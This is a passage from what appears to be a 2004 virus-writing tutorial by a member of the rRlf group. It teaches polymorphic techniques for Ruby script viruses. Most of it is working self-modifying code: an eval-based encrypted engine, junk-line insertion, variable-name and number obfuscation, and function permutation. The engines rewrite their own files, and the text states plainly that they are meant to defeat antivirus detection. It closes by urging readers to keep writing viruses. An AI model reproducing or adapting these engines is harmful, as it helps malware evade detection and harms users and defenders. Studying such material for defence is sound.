+           code='C'+ehxx+''+100.chr+'e'+bs+'A'+cojf+''+bs+''+83.chr+'tr'+105.chr+''+110.chr+'g'+bs+'mo'+qtze+'phing'
+
+       First you should check out the engine's code, and look at the explanation later on. I've added the
+       ready-to-run engine (already encrypted, otherwise it would not work), and the plain text in the
+       encrypted string. First, the whole engine:
+
+ - - - - - - - - - - - - - [ Polymorphism Example - Code-As-Sting morphing ] - - - - - - - - - - - - -
+bs=32.chr
+bn=10.chr
+mf=File.basename(__FILE__)
+jeol='w'
+vljp='e'
+pnvj='.'
+dzac='"'
+okas='m'
+vzcu='('
+ylwf='m'
+wrvn='"'
+qhze='c'
+syfp='d'
+xqfk='.'
+ueaz=','
+ymek='.'
+gnzv='i'
+sgzr='b'
+sgge='+'
+pttf='i'
+tuuz='c'
+kkwl='o'
+taot='d'
+plbx='i'
+ouij='0'
+wrat='e'
+nixi='+'
+covt='"'
+nnjw='c'
+ifpt='i'
+bwiy='e'
+jjgv='w'
+oheh='d'
+gvmz='='
+cxpe='3'
+ttjy='r'
+njpx='+'
+vkjp='.'
+asfu='s'
+pran='f'
+eoik='o'
+bvle='['
+uvvx='='
+uwbo='o'
+mpta=','
+pjor='2'
+havc='9'
+rhet='t'
+xdec='"'
+txwe='3'
+ndkt='3'
+lgtf='"'
+inuq='+'
+uguw=','
+saba='.'
+emnf='.'
+phdj='3'
+ucos='c'
+geul='+'
+xayn='f'
+ekau='7'
+iwok=')'
+rhom='9'
+wxrt='7'
+qcbu='c'
+qnke='d'
+zcas='('
+putq=')'
+bcug='9'
+xygd='+'
+bhcw='a'
+dbjs='d'
+ezjl='('
+ttul='9'
+jooo=')'
+eslo='r'
+dehb='i'
+yrkk='t'
+ygfw='"'
+uaau='1'
+jxec='9'
+tzqa='r'
+etto='3'
+keyq='r'
+ajoo='l'
+edvw='s'
+jwlo='o'
+syln='e'
+yvaq='3'
+bfuu='c'
+symo='"'
+ngeb='"'
+ybto='g'
+acco='v'
+efex='+'
+xrtx='d'
+lrdh='"'
+smyz='c'
+rbkp='9'
+myvh='c'
+rxug='e'
+xins='n'
+mpwk='d'
+tyrr='w'
+yzlc='o'
+chtw='e'
+code='i=0'+bn+'ne'+jeol+'c'+111.chr+'d'+vljp+'=3'+57.chr+'.'+99.chr+'hr'+bn+''+109.chr+'f=o'+112.chr+''+101.chr+'n("code'+pnvj+'rb'+dzac+')'+bn+''+99.chr+'b'+99.chr+'='+okas+'f.'+114.chr+'e'+97.chr+'d'+vzcu+'46)'+bn+''+ylwf+'f'+46.chr+'clos'+101.chr+''+bn+'m'+102.chr+'='+111.chr+'pen('+wrvn+''+qhze+'o'+syfp+''+101.chr+''+xqfk+'r'+98.chr+'"'+ueaz+'"w")'+bn+''+109.chr+'f'+ymek+''+119.chr+'r'+gnzv+'te(c'+sgzr+'c'+sgge+'"'+bn+'"'+41.chr+''+bn+'whil'+101.chr+''+bs+''+pttf+''+60.chr+'co'+100.chr+''+101.chr+'.'+108.chr+'en'+103.chr+''+116.chr+''+104.chr+''+bn+'if'+bs+''+tuuz+''+kkwl+''+taot+'e['+plbx+',1]'+61.chr+'='+49.chr+''+ouij+'.chr'+bs+''+116.chr+''+104.chr+'en'+bn+'n'+wrat+'wc'+111.chr+'d'+101.chr+'+'+61.chr+'39.chr+"+b'+110.chr+''+nixi+''+covt+''+43.chr+'39.'+nnjw+'h'+114.chr+''+bn+''+101.chr+'ls'+ifpt+''+102.chr+''+bs+'code[i,1]=='+51.chr+'2.c'+104.chr+''+114.chr+''+bs+'th'+bwiy+'n'+bn+'n'+101.chr+''+jjgv+'c'+111.chr+''+oheh+''+101.chr+'+'+gvmz+''+cxpe+'9'+46.chr+'c'+104.chr+''+ttjy+''+njpx+'"+b'+115.chr+''+43.chr+'"+39'+vkjp+'ch'+114.chr+''+bn+''+101.chr+'l'+asfu+'i'+pran+''+bs+'c'+eoik+'de'+bvle+'i'+44.chr+'1]'+uvvx+'=92.chr'+bs+''+116.chr+''+104.chr+'e'+110.chr+''+bn+'i'+102.chr+''+bs+'c'+uwbo+'de[i'+mpta+''+pjor+']=='+havc+'2.chr+"s"'+bs+''+rhet+'hen'+bn+''+110.chr+'ewcode+='+51.chr+'9'+46.chr+'chr+"+bs+'+xdec+''+43.chr+''+txwe+'9.chr'+bn+'else'+bn+''+110.chr+'ewcode+='+ndkt+''+57.chr+'.ch'+114.chr+'+'+lgtf+''+inuq+'bn+'+34.chr+'+'+51.chr+''+57.chr+''+46.chr+'chr'+bn+'end'+bn+'i'+43.chr+''+61.chr+'1'+bn+'elsi'+102.chr+''+bs+'code[i'+uguw+'1]==95'+saba+'chr'+bs+'the'+110.chr+''+bn+'new'+99.chr+'ode+'+61.chr+'34'+emnf+'chr+'+phdj+'9.'+ucos+'hr+"'+geul+'m'+xayn+'+"+3'+57.chr+''+46.chr+'c'+104.chr+'r+34.chr'+bn+'i+='+ekau+''+bn+'el'+115.chr+'e'+bn+'r='+114.chr+'and(6'+iwok+''+bn+'i'+102.chr+''+bs+'r=='+48.chr+''+bs+''+116.chr+'he'+110.chr+''+bn+'v='+40.chr+'ran'+100.chr+'(26)+'+rhom+''+wxrt+').'+qcbu+''+104.chr+'r'+43.chr+'(ran'+qnke+''+zcas+''+50.chr+'6'+putq+''+43.chr+''+bcug+'7).'+99.chr+''+104.chr+'r+(r'+97.chr+'n'+100.chr+'(26)+9'+55.chr+').'+99.chr+'hr'+xygd+'(r'+bhcw+''+110.chr+''+dbjs+''+ezjl+'26'+41.chr+''+43.chr+''+ttul+'7'+jooo+'.c'+104.chr+''+eslo+''+bn+'m'+102.chr+'.wr'+dehb+''+yrkk+'e(v+'+ygfw+'="+39'+46.chr+'chr+'+99.chr+'ode[i,'+uaau+']+3'+jxec+''+46.chr+''+99.chr+'h'+tzqa+'+1'+48.chr+'.c'+104.chr+'r)'+bn+'newcode'+43.chr+'='+etto+'9'+46.chr+''+99.chr+'h'+114.chr+''+43.chr+'"+"+v+"+"+3'+57.chr+'.ch'+keyq+''+bn+'e'+ajoo+''+edvw+'if'+bs+'r==1'+bs+'t'+104.chr+'en'+bn+'new'+99.chr+''+jwlo+'d'+syln+'+='+yvaq+'9.'+bfuu+''+104.chr+'r'+43.chr+''+symo+'+'+ngeb+''+43.chr+'Strin'+ybto+'(e'+acco+'a'+108.chr+'("?"'+efex+'c'+111.chr+''+xrtx+''+101.chr+'[i,1]))+'+lrdh+''+46.chr+''+smyz+''+104.chr+'r+"+3'+rbkp+'.'+99.chr+'hr'+bn+'else'+bn+'new'+myvh+'o'+100.chr+''+rxug+'+=code[i'+44.chr+'1'+93.chr+''+bn+'e'+xins+''+mpwk+''+bn+'e'+110.chr+''+100.chr+''+bn+'i+'+61.chr+''+49.chr+''+bn+'end'+bn+''+109.chr+'f.'+tyrr+''+114.chr+'i'+116.chr+'e("code'+61.chr+'"+newc'+yzlc+''+100.chr+''+chtw+'+3'+57.chr+'.chr+"'+bn+'e'+118.chr+'al'+40.chr+'code)"'+41.chr+''+bn+''
+eval(code)
+ - - - - - - - - - - - - - [ Polymorphism Example - Code-As-Sting morphing ] - - - - - - - - - - - - -
+
+       You see, that you dont understand anything from this one without decrypt it. Therefore here is
+       the encrypted version of the encrypter. It would not work, if you just use the decrypted version,
+       because 1) Eval can not use __FILE__, it has to be outside the encrypted text, 2) Ruby can not
+       find the character of 10.chr or 32.chr (space) and 3) the code has to use itself, therefore
+       there must be a variable containing the encryption tool. Well, now look at the encryption tool:
+
+
+ - - - - - - - - - - - - - [ Polymorphism Example II - Inside ] - - - - - - - - - - - - -
+i=0
+newcode=39.chr
+mf=open(__FILE__)
+  cbc=mf.read(46)
+mf.close
+mf=open(__FILE__,"w")
+mf.write(cbc+"\n")
+while i<code.length
+  if code[i,1]==10.chr then
+    newcode+=39.chr+"+bn+"+39.chr
+  elsif code[i,1]==32.chr then
+    newcode+=39.chr+"+bs+"+39.chr
+  elsif code[i,1]==92.chr then
+    if code[i,2]==92.chr+"s" then
+      newcode+=39.chr+"+bs+"+39.chr
+    else
+      newcode+=39.chr+"+bn+"+39.chr
+    end
+    i+=1
+  elsif code[i,1]==95.chr then
+    newcode+=34.chr+39.chr+"+mf+"+39.chr+34.chr
+    i+=7
+  else
+    r=rand(6)
+    if r==0 then
+      v=(rand(26)+97).chr+(rand(26)+97).chr+(rand(26)+97).chr+(rand(26)+97).chr
+      mf.write(v+"="+39.chr+code[i,1]+39.chr+10.chr)
+      newcode+=39.chr+"+"+v+"+"+39.chr
+    elsif r==1 then
+      newcode+=39.chr+"+"+String(eval("?"+code[i,1]))+".chr+"+39.chr
+    else
+      newcode+=code[i,1]
+    end
+  end
+  i+=1
+end
+mf.write("code="+newcode+39.chr+"\neval(code)")
+ - - - - - - - - - - - - - [ Polymorphism Example II - Inside ] - - - - - - - - - - - - -
+
+       The plain text should be understandable. The engine works this way:
+
+       --> First, when the engine starts, three variables are defined: 'bs' for space, 'bn' for 10.chr
+           and 'mf' for the current file name. 'bs' and 'bn' are created, because Ruby can't get the
+           ASCII numbers of 10/32.chr neighter the character number of 92.chr (because '\n' = 10.chr
+           and '\s' = 32.chr). And 'mf' is created because eval returns '(eval)' for '__FILE__'. That
+           leads to an error. Therefore they are created outside the encrypted string.
+       --> Next step is to define all the variables, which stands for one single charater. I have not
+           included a 'maximal-one-variable-of-every-character', because this would be much easier to
+           emulate for AVs. And we dont care if there are more, because the size would never be more
+           than 6-6.5kB, and Ruby is also very fast at encrypting the string.
+       --> Next, the variable 'code' is defined, which contains the whole encrypted code. At defineing
+           'code' the variables, which stands for one character, and the ASCII-numbers of each character
+           will be replaced by the original characters, which leads to the old, original, decrypted
+           code of the encryption-engine.
+       --> The last line in the file is a 'eval(code)'. Here the Ruby interpreter evaluates the decrypted
+           code.
+       --> The code first reads 46bytes from the original file, which are the three variables 'bs','bn'
+           and 'mf'.
+       --> Then the 'while' gets every single letter of the code.
+       --> First the engine checks, if the letter is a 10.chr, 32.chr or a '_' (__FILE__). If so, it will
+           not be encrypted but to 'newcode' (the variable, which gets the new encrypted code) one of the
+           three variables will be added.
+       --> Then the real encrypting happens. There are three ways:
+             + As a variable 1/6:
+                   print("a")
+               is the same as
+                   kfle="a"
+                   print(kfle)
+
+             + As ASCII number 1/6:
+                   print("a")
+               is the same as
+                   print(97.chr)
+
+             + Let it be a string = nothing change: 4/6
+       --> The last step is to add the 'newcode' to the origial file, and everything is ready.
+
+
+
+
+
+    c) Adding Trash
+
+       According to Vesselin Bontchev, adding Junk/Garbage is Polymorphism Level 3. This technique is
+       very often used in script viruses (VBS, JS, PHP) because it is not quite difficult to write such
+       an engine. This technique adds random code to the viral code, which doesn't do anything. Its
+       purpose is to return a variable size of the engine and to stop the possibility of detecting a 
+       code by two lines, which are next to each other (if line[n]=='this' AND line[n+1]=='that' then 'infected').
+       The following code includes at random places random garbage in with the chance of 3/10.
+       First you will see the code, then the explanation to it:
+
+
+ - - - - - - - - - - - - - [ Polymorphism Example - Adding Trash ] - - - - - - - - - - - - -
+def rn(rnum,t)
+  @rc=""
+  while rnum>0
+    if t==1 then
+      @rc+=(rand(26)+97).chr
+    else
+      @rc+=(rand(9)+49).chr
+    end
+    rnum-=1
+  end
+  return @rc
+end
+
+ @mf=open(__FILE__)
+ @code=""
+ @cc=@mf.read(1)
+while @cc!=nil
+  @code+=@cc
+  @cc=@mf.read(1)
+end
+ @mf.close
+ @newcode=""
+ @i=0
+while @i<@code.length
+  if @code[@i,1]==10.chr then
+    @newcode+=10.chr
+    @i+=1
+    if @code[@i,1]=='#' or @code[@i,1]=='@' then
+      while @code[@i,1]!=10.chr
+        @i+=1
+      end
+    else
+      if rand(10)==1 then
+        @newcode+='# '+rn(rand(50),1)+10.chr
+      elsif rand(10)==2 then
+        @newcode+='@'+rn(rand(10)+2,1)+"="+34.chr+rn(rand(23),1)+34.chr+10.chr
+      elsif rand(10)==3 then
+        @newcode+='@'+rn(rand(10)+2,1)+"="+rn(rand(23)+1,2)+10.chr
+      end
+    end
+  else
+    @newcode+=@code[@i,1]
+    @i+=1
+  end
+end
+ @mf=open(__FILE__,"w")
+ @mf.write(@newcode)
+ @mf.close
+ - - - - - - - - - - - - - [ Polymorphism Example - Adding Trash ] - - - - - - - - - - - - -
+
+       The code you can see above works really good. I'm going to explain now how exactly it
+       works:
+
+       --> First thing it does is to read its own code. The engine needs it, of course, later on
+           when it tries to remove old trash and add new one.
+       --> Then the engine gets every single letter of the code with a 'while'
+       --> The next step is the checking, if the current letter is a 10.chr (newline).
+           If it's a 10.chr, the code checks if the line is trash (@ or # as first sign).
+       --> Then it includes 3/10 a new trashline, if the current line was no trash.
+           There are three possibilities for a trash:
+              + '# '+randomlenght (0-50 lowercase-letters)-string: # jksdfhjksdjkiebncy
+              + '@'+random-string(2-12)+'="'+random-string(0-23)+'"': @wjkcma="kelcwmdsk"
+              + '@'+random-string(2-12)+'="'+random-numbers(1-24) : @lkwnvmxkyz=1935761
+       --> After that it adds the original line to the 'newcode'.
+       --> In the end it opens '__FILE__' and writes the 'newcode' to the file
+
+
+
+
+
+    d) Variable-Name Changing
+
+       This is maybe the most well-known polymorphic technique for script viruses. It is
+       already done in VBScript, JScript, PHP. That nearly forced me to write also
+       a Ruby Variable-Name Changing engine. So I did. If anybody dont know the technique,
+       i'll explain it: A virus code uses alot of variables, for doing different things.
+       Normally variables have static names, but they would not need then. So we are
+       going to change every variable in the code, and replace it with a new one. This sounds
+       not difficult, and it is not difficult. Just look at the following code, which changes
+       its variables on every execution. The explanation follows after the code.
+
+ - - - - - - - - - - - - - [ Polymorphism Example - Variable-Name changing ] - - - - - - - - - - - - -
+def randnumf(rnum)
+  rc=""
+  rnum+=3
+  while rnum>0
+    rc+=(rand(26)+97).chr
+    rnum-=1
+  end
+  return rc
+end
+
+vlist=["myfile","vlist","randnumf","rnum","rc","nlist","counterl","myfile","counteri","mycode","mycone","counterj","counterk","mynextfile"]
+nlist=[]
+counterl=0
+while counterl<vlist.length
+  nlist[counterl]=randnumf(10)
+  counterl+=1
+end
+myfile=open(__FILE__)
+counteri=0
+mycode=""
+mycone=myfile.read(1)
+while mycone!=nil
+  mycode+=mycone
+  mycone=myfile.read(1)
+  counteri+=1
+end
+counterk=0
+
+while counterk<vlist.length
+  counterj=0
+  while counterj<mycode.length
+    if mycode[counterj,vlist[counterk].length]==vlist[counterk] then
+      mycode[counterj,vlist[counterk].length]=nlist[counterk]
+      counterj+=vlist[counterk].length
+    else
+      counterj+=1
+    end
+  end
+  counterk+=1
+end
+
+mynextfile=open(__FILE__,"w")
+mynextfile.write(mycode)
+mynextfile.close
+ - - - - - - - - - - - - - [ Polymorphism Example - Variable-Name changing ] - - - - - - - - - - - - -
+
+       The idea of that technique isn't new, but its code is. Read the explanation to get the idea
+       how this engine works:
+
+         --> First the code defines an array called "vlist", which contains all variable names of
+             the whole code.
+         --> Then the empty array 'nlist' is defined. In the next lines this array will be filed
+             with random characters returned by the 'randnumf'-function. Now 'nlist' has as much elements
+             as 'vlist', but the 'nlist' elements are new and random.
+         --> Then the code opens itself and reads the whole code.
+         --> Then the most important part of the code: The first 'while' gets every element of the
+             'vlist' (which contains the current used variable-names). The second 'while' gets every
+             single letter of the code.
+         --> Then the 'if' checks if the current letter is the start of the current replaceable variable
+             (well, not exactly, but it's easier to explain). If it is equal, the founden variable will
+             be replaced with the variable of 'nlist'. And this goes on for every letter and every variable.
+         --> In the end, the code will be written back to the file.
+
+
+
+
+
+      e) Number Changing
+
+         As you should already know it from it's name, this technique changes every number in the code.
+         The main thing of this technique is, that a calculation could also return the real number of a
+         code. This technique has also be used in JavaScript or PHP. If you don't understand my explanation
+         just look at the example:
+         1 = (((156+224)/(150/30))-((13695+69)/(49+137))) = (-((17875/65)-(275-66))+((1012/46)+(9495/211)))
+         This should explain the idea. Now let's move to the code:
+
+ - - - - - - - - - - - - - [ Polymorphism Example - Number changing ] - - - - - - - - - - - - -
+def rc(number,rn,rre)
+  number=Integer(number)
+  if rn==0 then
+    return "("+String(number-rre)+"+"+String(rre)+")"
+  elsif rn==2 then
+    return "("+String(number+rre)+"-"+String(rre)+")"
+  else
+    return "("+String(number*rre)+"/"+String(rre)+")"
+  end
+end
+
+mf=open(__FILE__)
+code=""
+c=mf.read(1)
+while c!=nil
+ code+=c
+ c=mf.read(1)
+end
+
+i=0
+while i<code.length
+  n=""
+  while code[i,1]!=10.chr and code[i,1]!=32.chr and eval("?"+code[i,1])<=57 and eval("?"+code[i,1])>=48
+    n+=code[i,1]
+    i+=1
+  end
+  if n!="" then
+    rndc=rc(n,rand(3),(rand(250)+1))
+    code[i-n.length,n.length]=rndc
+    i+=(rndc.length-n.length)
+  end
+  i+=1
+end
+
+mf=open(__FILE__,"w")
+mf.write(code)
+mf.close
+ - - - - - - - - - - - - - [ Polymorphism Example - Number changing ] - - - - - - - - - - - - -
+
+         Explanation of the code follows now, as at every example:
+
+         --> First the code reads it's own code
+         --> Then the first 'while' gets every single letter of the code.
+         --> The second 'while' gets every number of the code. A number is a letter with
+             the character 48<= x <= 58 AND x!=(32||10).chr. I had to use the 10|32.chr
+             because it could be that the x is the last letter of a line.
+         --> It gives the number, a rnd(3), and a rnd(250)+1 to the 'rc'-function.
+             This function then makes the new calculation. For instance:
+             250=(350-100) | 250=(149+101) | 250=(2500/10)
+         --> In the end the code writes the new code with the calculations to __FILE__.
+
+
+
+
+
+      f) Permutation
+
+         This is a very well known technique for morphing viruses, and not only for scripts.
+         A permutation code will be splitted in several parts, and then mixed together in a
+         random order. How could we do it in Ruby? We use functions, and split the code into
+         funtions, which are put together. Look at the code to understand the technique:
+
+ - - - - - - - - - - - - - [ Polymorphism Example - Permutation ] - - - - - - - - - - - - -
+def start()
+  vf=[]
+  code=""
+  mf=open(__FILE__)
+  c=mf.read(1)
+  while c!=nil
+    code+=c
+    c=mf.read(1)
+  end
+  mf.close
+  st2(code,0,vf)
+end
+
+def st2(code,i,vf)
+  fc=6
+  while i<code.length
+    if code[i,3]=="d"+"ef" then
+      vf=st3(code,i,vf,fc)
+      fc-=1
+    end
+    i+=1
+  end
+  st6(vf)
+end
+
+
+def st3(code,i,vf,fc)
+  j=1
+  iold=i
+  while j>0
+    if code[i,3]=="e"+"nd" then
+      j=st4(j)
+    end
+    if code[i,5]=="w"+"hile" or code[i,3]=="i"+"f " then
+      j=st5(j)
+    end
+    i+=1
+  end
+  vf[fc]=code[iold, i-iold+3]
+  return vf
+end
+
+def st4(j)
+  return(j-1)
+end
+
+
+def st5(j)
+  return(j+1)
+end
+
+def st6(vf)
+  mf=open(__FILE__,"w")
+  fc=0
+  while fc<6
+    a=rand(6)+1
+    if vf[a]!="" then
+      mf.write(vf[a])
+      vf[a]=""
+      fc+=1
+    end
+  end
+  mf.write("\nstart()")
+  mf.close
+end
+
+start()
+ - - - - - - - - - - - - - [ Polymorphism Example - Permutation ] - - - - - - - - - - - - -
+
+         The code you are looking at has 6 function, which changes their order at every execution
+         The following code has 720 mutations: 6! = 6*5*4*3*2*1. A very important thing when writing
+         a permutation virus with functions is, that you must give each funtion every variable-value
+         it needs, because all variables are defined inside the function, and not global. Now read on
+         how the thing works:
+
+         --> First, 'start()' calls the first function.
+         --> In the function 'start()' the content of the current file will be read, and then it calls
+             the next function, 'st2'.
+         --> 'st2' is somehow the main function. First it searchs a 'def', and if the 'def' is founden, it
+             calls 'st3'.
+         --> 'st3' searchs the whole code of the function. If a 'if' or a 'while' is founden, a counter
+             increases (because these commands also ends with an 'end') by 'st5'. If an 'end' is founden,
+             the counter decreases by 'st4'. In the end the function writes the whole code of the founden
+             function to vh[n] and returns that variable to 'st2'.
+         --> If every function is founden, 'st2' calls 'st6' for writing the whole function in a random
+             order to the __FILE__.
+
+
+
+
+
+  4) Last Words
+
+     In the end I have to say that Ruby is a quiet nice language, especially for viruses. Many technique
+     are able to bring them to reality, even if some important commands, which are available in other
+     languages, are missing. I hope that this tutorial helps you, firstly learning a maybe new language and
+     secondly learning how to write a virus for it.
+     An article normally should end with greets, but I'm too lazy for that and I'm scared of forgetting
+     anybody, so my greets goes to everybody. Especially to my home-group rRlf (rrlf.host.sk) :)
+     Now, a thank you to you, reader, for still reading the maybe most uninteresting part of the article :)
+     I hope you have liked it, and I would be very happy if you could send me your opinion, maybe bug (I
+     dont think so) or suggestions! One important part in the end: Never stopp writing viruses, don't let
+     virus writing dying! OK, see you out there soon...
+
+
+                                                        - - - - - - - - - - - - - - -
+                                                          Second Part To Hell/[rRlf]  
+                                                          www.spth.de.vu
+                                                          spth@priest.com
+                                                          written from oct-november 2004
+                                                          Austria
+                                                        - - - - - - - - - - - - - - - 
